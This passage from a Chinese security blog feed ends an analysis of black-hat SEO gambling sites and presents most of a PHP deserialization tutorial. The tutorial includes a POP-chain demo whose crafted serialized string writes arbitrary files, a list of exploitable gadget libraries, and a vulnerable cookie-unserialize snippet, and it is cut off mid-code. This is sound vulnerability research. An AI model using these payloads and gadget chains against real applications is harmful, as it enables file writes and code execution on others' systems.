alt=""></p><p>链接工厂，是指由大量网页交叉链接而构成的一个网络系统，通过加入外链来操纵链接配置。加入的外链的网站内容与互联网上的其他网站相异。这些网页可能来自同一个域或多个不同的域，甚至可能来自不同的服务器。一个站点加入这样一个“链接工厂”后，一方面它可得到来自该系统中所有网页的链接，同时作为交换它需要“奉献”自己的链接，借此方法来提升链接得分，从而达到干预链接得分。</p><p>其目的是通过搜索引擎获得大量流量，或者是将链接指向同一个网站，以提高搜索排名。</p><p>对于搜索引擎来说，规模化的链接工厂是极难发现的，通过与配合其他手法组成的“团体”就是现在我们看到的组织化的，系统化的博彩站点。</p><h1 id="0x04-具体案例分析"><a href="#0x04-具体案例分析" class="headerlink" title="0x04 具体案例分析"></a>0x04 具体案例分析</h1><p>首先，我们利用360搜索搜索“赌博谐音”灰词</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005299905749.jpg" alt=""></p><p>前五个链接全都是博彩网站。</p><h2 id="1-案例——前四都是一家"><a href="#1-案例——前四都是一家" class="headerlink" title="1. 案例——前四都是一家"></a>1. 案例——前四都是一家</h2><p>三个网站，除了劫持的样式不同外，基本的执行过程都是一样的。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005302670141.jpg" alt=""></p><p>首先跳转到<code>http://www.wk2m.net/RLQ4kC325199813.html</code>，之后加载js：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005303201181.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005305735315.jpg" alt=""></p><p>我们简化一下js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.writeln(<span class="string">"&lt;a href=http://www.w8858.top/?rtl=4779  target=_0&gt;&lt;center&gt;&lt;img src=/ads.jpg broder=0&gt;&lt;/center&gt;&lt;/a&gt;"</span>);</span><br></pre></td></tr></table></figure><p>也就是只要我们点击该图片，就会跳转到博彩网站的注册会员处：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005309941449.jpg" alt=""></p><h3 id="为何这四个网站会在搜索排行第一位"><a href="#为何这四个网站会在搜索排行第一位" class="headerlink" title="为何这四个网站会在搜索排行第一位"></a>为何这四个网站会在搜索排行第一位</h3><p>主要使用了以下黑产SEO的方法：</p><ul><li><p>网页劫持</p><p>  劫持复制了微软安全中心的页面样式。</p></li><li><p>垃圾链接</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005335718055.jpg" alt=""></p><p>  其中包含了大量与主题内容不相关的链接，用以提高网站的权重。</p></li><li><p>关键字堆砌</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005337468367.jpg" alt=""></p></li></ul><pre><code>在网页中大量重复关键词，提高关键词的密度，达到提高关键词排名的效果。</code></pre><ul><li><p>隐藏链接</p><p>  同上图，我们还可以看到很多关键字隐藏在链接中，以提升关键字排名效果。</p></li><li><p>桥页</p><p>  其中的桥页就不细说了，给一张图：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005340909312.jpg" alt=""></p></li><li><p>黑链</p><p>  通过js将链接及图片嵌入这个桥页中。</p></li></ul><p>同时，除开这些手法之外，还是使用了泛二级域名站群和链轮的方式，以此增加了自己的pv值。</p><p>首先看一下收录情况：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005327350147.jpg" alt=""></p><p>可以看到360对其的收录量到达了7480，百度对其的反链达到了12w多。</p><p>相对一个这样的小的指数，这样的收录量和反链数已经很多了，相对来说所占的权重也是非常高的。</p><p>之后，我们发现这个站点还使用了泛二级域名站以及链轮的方式，以增加自己的收录：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005362660787.jpg" alt=""></p><p>我们再看一下这个站的出站链接：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005363121624.jpg" alt=""></p><p>所有的链接的特征与该网页特征相符：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005364195561.jpg" alt=""></p><h2 id="2-案例——较弱的第五"><a href="#2-案例——较弱的第五" class="headerlink" title="2. 案例——较弱的第五"></a>2. 案例——较弱的第五</h2><p>最简单的跳转模式，有趣的是写在了404，这样就就避免了搜索引擎的过滤：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005375874332.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005376227906.jpg" alt=""></p><p>看一下这个脚本：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005376969561.jpg" alt=""></p><p>同样是用了百度统计的接口用来统计数据，然后就是跳转到目标页面：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005378002531.jpg" alt=""></p><p>做适配与插入<code>&lt;iframe&gt;</code>标签。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005414201282.jpg" alt=""></p><p>同时利用404的状态码，过掉了网盾。</p><p>多看了一下，<code>www.dxolkf.net</code>也是个博彩网站，所利用的跳转脚本与上面的脚本差不多，只是改了一下url而已。</p><h3 id="为什么一个如此多404状态的页面会有这么高的收录"><a href="#为什么一个如此多404状态的页面会有这么高的收录" class="headerlink" title="为什么一个如此多404状态的页面会有这么高的收录"></a>为什么一个如此多404状态的页面会有这么高的收录</h3><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005382493256.jpg" alt=""></p><p>看到收录的情况非常的一般，看了一下这些链接：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005383487079.jpg" alt=""></p><p>发现了相同的地方，<code>www.dxolkf.net</code>这个链接所提供的应该是垃圾链接与关键词的的堆砌，用以提高排名，并通过js脚本来实现目标页的跳转。</p><p>同时使用了链轮来加大<code>www.dxolkf.net</code>的PV值。但是相比前4个来说，做的相对简单，所以收录量并不好。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>通过上面的案例，我们可以看到黑产SEO的利用手段，关键还是在于制造蜘蛛池，通过桥页跳转到目标站。在网站的搭建过程中，普遍的使用泛二级域名站与链轮，使其排名得以提高。</p><h2 id="搜索方面的问题"><a href="#搜索方面的问题" class="headerlink" title="搜索方面的问题"></a>搜索方面的问题</h2><ul><li>搜索的爬虫陷入链接工厂中，形成死循环，导致链接工厂中的PV值提升，使其占据主页</li><li>对于链轮和泛二级域名站没有特别好的判断，造成目标站的PV值上升，使其占据主页</li><li>对于关键字堆砌和垃圾链接的解决方案有不完善的地方。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前分析黑产SEO的笔记&lt;/p&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="https://lucifaer.com/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑产研究" scheme="https://lucifaer.com/tags/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
      <category term="BlackHat SEO" scheme="https://lucifaer.com/tags/BlackHat-SEO/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="https://lucifaer.com/2017/07/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2017/07/19/PHP反序列化漏洞/</id>
    <published>2017-07-19T05:57:07.000Z</published>
    <updated>2018-11-29T09:36:07.918Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章为针对PHP反序列化漏洞的介绍与分析。<br><a id="more"></a></p><h1 id="0x00-序列化的作用"><a href="#0x00-序列化的作用" class="headerlink" title="0x00 序列化的作用"></a>0x00 序列化的作用</h1><ul><li>（反）序列化给我们传递对象提供了一种简单的方法。<ul><li><code>serialize()</code>将一个对象转换成一个字符串</li><li><code>unserialize()</code>将字符串还原为一个对象</li></ul></li><li>反序列化的数据本质上来说是没有危害的</li><li>用户可控数据进行反序列化是存在危害的</li></ul><p>可以看到，反序列化的危害，关键还是在于可控或不可控。</p><h1 id="0x01-PHP序列化格式"><a href="#0x01-PHP序列化格式" class="headerlink" title="0x01 PHP序列化格式"></a>0x01 PHP序列化格式</h1><h2 id="1-基础格式"><a href="#1-基础格式" class="headerlink" title="1. 基础格式"></a>1. 基础格式</h2><ul><li>boolean<ul><li>b:<value>;</value></li><li>b:1;  //  True</li><li>b:0;  //  False</li></ul></li><li>integer<ul><li>i:<value>;</value></li><li>i:1;  //  1</li><li>i:-3; //  -3</li></ul></li><li>double<ul><li>d:<value>;</value></li><li>d:1.2345600000000001; //  1.23456（php弱类型所造成的四舍五入现象）</li></ul></li><li>NULL<ul><li>N;    //NULL</li></ul></li><li>string<ul><li>s:<length>:”<value>“;</value></length></li><li>s:8:”INSOMNIA”;   //  “INSOMNIA”</li></ul></li><li>array<ul><li>a:<length>:{key, value pairs};</length></li><li>a:2:{s:4:”key1”;s:6:”value1”;s:6:”value2”;}   //  array(“key1” =&gt; “value1”, “key2” =&gt; “value2”)</li></ul></li></ul><h2 id="2-序列化举例"><a href="#2-序列化举例" class="headerlink" title="2. 序列化举例"></a>2. 序列化举例</h2><blockquote><p>test.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'Inactive'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来生成一下它的序列化字符串：</p><blockquote><p>serialize.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./test.php"</span>;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">$object-&gt;set_flag(<span class="string">'Active'</span>);</span><br><span class="line">$data = serialize($object);</span><br><span class="line">file_put_contents(<span class="string">'serialize.txt'</span>, $data);</span><br></pre></td></tr></table></figure><p>代码不难懂，我们通过生成的序列化字符串，来细致的分析一下序列化的格式：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999100639649.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"testflag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure><h2 id="3-注意"><a href="#3-注意" class="headerlink" title="3. 注意"></a>3. 注意</h2><p>这里有一个需要注意的地方，<code>testflag</code>明明是长度为8的字符串，为什么在序列化中显示其长度为10？</p><p>翻阅php官方文档我们可以找到答案：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999107284787.jpg" alt=""></p><p>对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999111683485.jpg" alt=""></p><p>所以说，在我们需要传入该序列化字符串时，需要补齐两个空字节：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"%00test%00flag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="4-反序列化示例"><a href="#4-反序列化示例" class="headerlink" title="4. 反序列化示例"></a>4. 反序列化示例</h2><blockquote><p>unserialize.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">$object = unserialize($filename);</span><br><span class="line"></span><br><span class="line">var_dump($object-&gt;get_flag());</span><br><span class="line">var_dump($object);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999120371570.jpg" alt=""></p><h1 id="0x02-PHP（反）序列化有关的魔法函数"><a href="#0x02-PHP（反）序列化有关的魔法函数" class="headerlink" title="0x02 PHP（反）序列化有关的魔法函数"></a>0x02 PHP（反）序列化有关的魔法函数</h1><ul><li><p><strong>construct(), </strong>destruct()</p><p>  构造函数与析构函数</p></li><li><p><strong>call(), </strong>callStatic()</p><p>  方法重载的两个函数</p><ul><li>__call()是在对象上下文中调用不可访问的方法时触发</li><li>__callStatic()是在静态上下文中调用不可访问的方法时触发。</li></ul></li><li><p><strong>get(), </strong>set()</p><ul><li>__get()用于从不可访问的属性读取数据。</li><li>__set()用于将数据写入不可访问的属性。</li></ul></li><li><p><strong>isset(), </strong>unset()</p><ul><li>__isset()在不可访问的属性上调用isset()或empty()触发。</li><li>__unset()在不可访问的属性上使用unset()时触发。</li></ul></li><li><strong>sleep(), </strong>wakeup()<ul><li>serialize()检查您的类是否具有魔术名<strong>sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。</strong>sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果您有非常大的对象，不需要完全保存，该功能将非常有用。</li><li>unserialize()使用魔术名<strong>wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。</strong>wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。  </li></ul></li><li><p>__toString()</p><ul><li>__toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。</li></ul></li><li><p>__invoke()</p><p>  当脚本尝试将对象调用为函数时，调用__invoke()方法。</p></li><li><p>__set_state()</p></li><li>__clone()</li><li>__debugInfo()</li></ul><h1 id="0x03-PHP反序列化与POP链"><a href="#0x03-PHP反序列化与POP链" class="headerlink" title="0x03 PHP反序列化与POP链"></a>0x03 PHP反序列化与POP链</h1><h2 id="1-魔术方法与POP链"><a href="#1-魔术方法与POP链" class="headerlink" title="1. 魔术方法与POP链"></a>1. 魔术方法与POP链</h2><p>就如前文所说，当反序列化参数可控时，可能会产生严重的安全威胁。<br>面向对象编程从一定程度上来说，就是完成类与类之间的调用。就像ROP一样，POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”。在PHP中，“组件”就是这些魔术方法（<code>__wakeup()</code>或<code>__destruct</code>）。</p><p>一些对我们来说有用的POP链方法：</p><ul><li>命令执行：<ul><li>exec()</li><li>passthru()</li><li>popen()</li><li>system()</li></ul></li><li>文件操作：<ul><li>file_put_contents()</li><li>file_get_contents()</li><li>unlink()</li></ul></li></ul><h2 id="2-POP链demo"><a href="#2-POP链demo" class="headerlink" title="2. POP链demo"></a>2. POP链demo</h2><blockquote><p>popdemo.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"demo\n"</span>;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">'./demo'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($filename, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码即完成了一个简单的POP链，若传入一个构造好的序列化字符串，则会完成写文件操作。</p><blockquote><p>poc.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> popdemo();</span><br><span class="line">file_put_contents(<span class="string">'./pop_serialized.txt'</span>, serialize($demo));</span><br></pre></td></tr></table></figure><blockquote><p>pop_unserialize.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">unserialize(file_get_contents(<span class="string">'./pop_serialized.txt'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999166628793.jpg" alt=""></p><p>表面看上去，我们完美的执行了代码的功能，那么我们改一下序列化代码，看一看效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999171016380.jpg" alt=""></p><p>改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"popdemo"</span>:<span class="number">2</span>:&#123;s:<span class="number">13</span>:<span class="string">"popdemodata"</span>;s:<span class="number">5</span>:<span class="string">"hack</span></span><br><span class="line"><span class="string">"</span>;s:<span class="number">17</span>:<span class="string">"popdemofilename"</span>;s:<span class="number">6</span>:<span class="string">"./hack"</span>;&#125;</span><br></pre></td></tr></table></figure><p>便执行了我们想要执行的效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999174258769.jpg" alt=""></p><h2 id="3-Autoloading与（反）序列化威胁"><a href="#3-Autoloading与（反）序列化威胁" class="headerlink" title="3. Autoloading与（反）序列化威胁"></a>3. Autoloading与（反）序列化威胁</h2><ul><li>PHP只能<code>unserialize()</code>那些定义了的类</li><li>传统的PHP要求应用程序导入每个类中的所有类文件，这样就意味着每个PHP文件需要一列长长的<code>include</code>或<code>require</code>方法，而在当前主流的PHP框架中，都采用了Autoloading自动加载类来完成这样繁重的工作。</li><li>在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。</li></ul><p>举个例子：</p><p>目录结构为下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999254540532.jpg" alt=""></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">autoload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load1</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> $className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load2</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="string">'./app/'</span>.$className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">'./app/'</span>.$className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load3</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="string">'./lib/'</span>.$className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">'./lib/'</span>.$className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load1()'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load2()'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load3()'</span>);</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test1();</span><br><span class="line">$test2 = <span class="keyword">new</span> test2();</span><br><span class="line">$test3 = <span class="keyword">new</span> test3();</span><br></pre></td></tr></table></figure><blockquote><p>test1.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1_data = <span class="string">'test1_data'</span>;</span><br><span class="line">    <span class="keyword">private</span> $test1_filename = <span class="string">'./test1_demo.txt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;test1_filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($test1_filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($test1_filename, <span class="keyword">$this</span>-&gt;test1_data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其余的<code>test2</code>和<code>test3</code>和<code>test1</code>的内容类似。</p><p>运行一下<code>index.php</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999262214593.jpg" alt=""></p><p>可以看到已经自动加载类会自动寻找已经注册在其队列中的类，并在其被实例化的时候，执行相关的操作。</p><p>若想了解更多关于自动加载类的资料，请查阅<a href="http://lucifaer.com/index.php/archives/17/">spl_autoload_register</a></p><h2 id="4-Composer与Autoloading"><a href="#4-Composer与Autoloading" class="headerlink" title="4. Composer与Autoloading"></a>4. Composer与Autoloading</h2><p>说到了Autoloader自动加载类，就不得不说一下Composer这个东西了。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。</p><p>经常搭建框架环境的同学应该对这个非常熟悉了，无论是搭建一个新的Laravel还是一个新的Symfony，安装步骤中总有一步是通过Composer来进行安装。</p><p>比如在安装Laravel的时候，执行<code>composer global require &quot;laravel/installer&quot;</code>就可以搭建成以下目录结构的环境：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999270597374.jpg" alt=""></p><p>其中已经将环境所需的依赖库文件配置完毕，正是因为Composer与Autuoloading的有效结合，才构成了完整的POP数据流。</p><h1 id="0x04-反序列化漏洞的挖掘"><a href="#0x04-反序列化漏洞的挖掘" class="headerlink" title="0x04 反序列化漏洞的挖掘"></a>0x04 反序列化漏洞的挖掘</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>通过上面对Composer的介绍，我们可以看出，Composer所拉取的依赖库文件是一个框架的基础。</p><p>而Composer默认是从Packagist来下载依赖库的。</p><p>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p><p>目前总结出来两种大的趋势，还有一种猜想：</p><ol><li>从可能存在漏洞的依赖库文件入手</li><li>从应用的代码框架的逻辑上入手</li><li>从PHP语言本身漏洞入手</li></ol><p>接下来逐个的介绍一下。</p><h2 id="2-依赖库"><a href="#2-依赖库" class="headerlink" title="2. 依赖库"></a>2. 依赖库</h2><p>以下这些依赖库，准确来说并不能说是依赖库的问题，只能说这些依赖库存在我们想要的文件读写或者代码执行的功能。而引用这些依赖库的应用在引用时并没有完善的过滤，从而产生漏洞。</p><ul><li>cartalyst/sentry</li><li>cartalyst/sentinel</li></ul><p>寻找依赖库漏洞的方法，可以说是简单粗暴：</p><ul><li>首先在依赖库中使用<code>RIPS</code>或<code>grep</code>全局搜索<code>__wakeup()</code>和<code>__destruct()</code></li><li>从最流行的库开始，跟进每个类，查看是否存在我们可以利用的组件（可被漏洞利用的操作）</li><li>手动验证，并构建POP链</li><li>利用易受攻击的方式部署应用程序和POP组件，通过自动加载类来生成poc及测试漏洞。</li></ul><p>以下为一些存在可利用组件的依赖库：</p><ul><li>任意写<ul><li>monolog/monolog(&lt;1.11.0)</li><li>guzzlehttp/guzzle</li><li>guzzle/guzzle</li></ul></li><li>任意删除<ul><li>swiftmailer/swiftmailer</li></ul></li><li>拒绝式服务(proc_terminate())<ul><li>symfony/process</li></ul></li></ul><p>下面来举一个老外已经说过的经典例子，来具体的说一下过程。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="1-寻找可能存在漏洞的应用"><a href="#1-寻找可能存在漏洞的应用" class="headerlink" title="1. 寻找可能存在漏洞的应用"></a>1. 寻找可能存在漏洞的应用</h4><p>存在漏洞的应用：cartalyst/sentry</p><p>漏洞存在于：/src/Cartalyst/Sentry/Cookies/NativeCookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCookie</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     ...</span><br><span class="line">     <span class="keyword">return</span> unserialize($_COOKIE[<span class="keyword">$this</span>-&gt;getKey()]);</span><br><span class="line">     ...</span><br><span class="line">  &#125;</span><br><span 